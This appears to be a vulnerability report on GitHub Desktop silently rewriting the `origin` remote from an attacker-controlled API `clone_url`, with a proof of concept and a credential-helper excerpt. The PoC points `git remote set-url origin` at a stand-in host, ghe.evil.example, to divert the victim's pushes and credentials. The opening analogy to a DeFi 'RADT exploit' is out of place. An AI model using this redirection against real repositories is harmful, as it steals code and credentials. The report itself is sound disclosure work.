## Title
Silent, unconfirmed rewrite of the `origin` remote URL from an attacker-controlled GitHub API response - (`app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
The reported RADT exploit's core primitive is that a contract trusted an attacker-influenced value fed into a state-recalculation routine (`sync()`), overwriting a security-relevant invariant (the pool reserves) without validating the underlying source of that value. The GitHub Desktop analog is `updateRemoteUrl()`, which silently overwrites the local `origin` remote URL with `apiRepo.clone_url` — a value that comes directly from a `GET /repos/{owner}/{name}` response — validating only that the URL *scheme* is unchanged, never that its *host* is trustworthy.

### Finding Description
`updateRemoteUrl` is invoked automatically on essentially every repository refresh cycle via `repositoryWithRefreshedGitHubRepository`: [1](#0-0) 

It fetches the repository object from the API for whichever account/endpoint is associated with the repo, then calls `updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)` with no further checks on where `apiRepo` came from.

Inside `updateRemoteUrl`, the only guard against an unexpected `clone_url` is a **protocol-scheme** comparison, not a hostname comparison: [2](#0-1) 

`remoteUrlUnchanged` only checks that the *previously cached* `gitHubRepository.cloneURL` still matches the local remote — it never pins the *new* `apiRepo.clone_url` to the account's registered endpoint hostname. As long as the scheme matches (`https:` == `https:`), any host/owner/name the API returns will be written straight into the local git config via `gitStore.setRemoteURL` → `git remote set-url origin <url>`: [3](#0-2) 

By contrast, Desktop already recognizes this class of operation as sensitive for the **upstream** remote and gates it behind an explicit confirmation dialog: [4](#0-3) 

No equivalent confirmation exists for the default (`origin`) remote — the exact remote used for ordinary "Push"/"Fetch" operations.

### Impact Explanation
An attacker who controls the GitHub API object returned for a repository (e.g., a malicious or compromised GitHub Enterprise Server the victim has added as an account — explicitly a permitted attacker model per the report's "GitHub API object" category) can set `clone_url` to any URL sharing the same scheme. Desktop will then silently rewrite `origin` to that URL with no dialog, no warning banner, and no user action beyond normal use (opening the repo, background refresh, or fetch). All subsequent pushes/fetches for that repository transparently go to the attacker's endpoint instead of the legitimate one — this is exactly the "silent corruption of what the user commits or pushes" impact category. If the attacker keeps the malicious `clone_url` on the same hostname as the account's endpoint, the trampoline credential helper (which matches credentials by hostname/endpoint, not by owner/repo) will transparently authenticate to it with the victim's real token: [5](#0-4) 

### Likelihood Explanation
No local access, malware, or social engineering is required. Any account whose backing API server is attacker-controlled (per the accepted "GitHub API object" threat) will trigger this on the very next repository refresh/select/fetch cycle, which happens automatically and routinely in normal Desktop usage.

### Recommendation
- Require that the new `clone_url`'s hostname match the account's registered API endpoint hostname (not just protocol) before silently rewriting `origin`.
- Route default-remote auto-updates through the same explicit confirmation UX already used for the upstream remote (`UpstreamAlreadyExists`), rather than calling `gitStore.setRemoteURL` unconditionally.
- Additionally validate the API repository's numeric ID matches the one already associated locally before trusting a changed `clone_url`.

### Proof of Concept
1. Victim adds a GitHub Enterprise account whose server is attacker-controlled (or later compromised) and clones/opens a repository tracked through that account.
2. Attacker's server responds to `GET /repos/{owner}/{name}` with `clone_url: "https://ghe.evil.example/attacker/repo.git"`, keeping `https:` scheme.
3. On the next background refresh (`repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl`), Desktop silently executes `git remote set-url origin https://ghe.evil.example/attacker/repo.git` — no dialog shown.
4. The victim's next "Push" in Desktop sends their commits to the attacker's repository instead of the intended one, authenticated with their real credentials if the hostname is shared with the account endpoint. [6](#0-5)

const getEndpointKind = async (cred: Credential, store: Store) => {
  const credentialUrl = getCredentialUrl(cred)
  const endpoint = `${credentialUrl}`

  if (isGist(endpoint)) {
    return 'generic'
  }

  if (isDotCom(endpoint)) {
    return 'github.com'
  }

  if (isGHE(endpoint)) {
    return 'ghe.com'
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  const existingAccount = await findGitHubTrampolineAccount(store, endpoint)
  if (existingAccount) {
    return isDotCom(existingAccount.endpoint) ? 'github.com' : 'enterprise'
  }

  // All GitHub hosts use HTTPS, so if the protocol is not HTTPS we can
  // assume that this is not a GitHub host.
  if (credentialUrl.protocol !== 'https:') {
    return 'generic'
  }

  return (await isGitHubHost(endpoint)) ? 'enterprise' : 'generic'
}
